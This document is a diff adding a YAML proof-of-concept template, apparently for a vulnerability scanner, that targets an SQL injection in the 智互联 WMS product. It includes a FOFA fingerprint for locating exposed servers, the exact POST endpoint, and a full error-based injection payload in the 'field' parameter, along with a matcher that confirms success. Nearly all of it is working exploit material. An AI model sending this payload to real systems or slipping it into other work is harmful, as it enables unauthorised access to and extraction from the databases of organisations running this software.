@@ -1,0 +1,22 @@
+id: poc-yaml-zhilink-getsyspdaversionlistbyparams-sqli
+info:
+  name: 智互联WMS getsyspdaversionlistbyparams SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 智互联WMS
+  fofa: icon_hash="155833598"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /dapilc/restful/service/ilcwmsplus/ISysPdaVersionService/getsyspdaversionlistbyparams
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"condition\": {\n    \"field\": \"createDate,(select/**/5422/**/from(select/**/count(*),concat(0x7e,md5({{.t1}}),0x7e,floor(rand(0)*2))x/**/from/**/information_schema.plugins/**/group/**/by/**/x)a)\"\
+    ,\n    \"order\": \"asc\"\n  },\n  \"current\": 1,\n  \"size\": 1\n}"
+  expression: status_code == 500 && contains(body,"SQLState") && contains(body,"java.sql.SQL")
+    && contains(body,"\"duration\":") && contains(body,"Internal Server Error") &&
+    contains(body,t2)
+transport: http
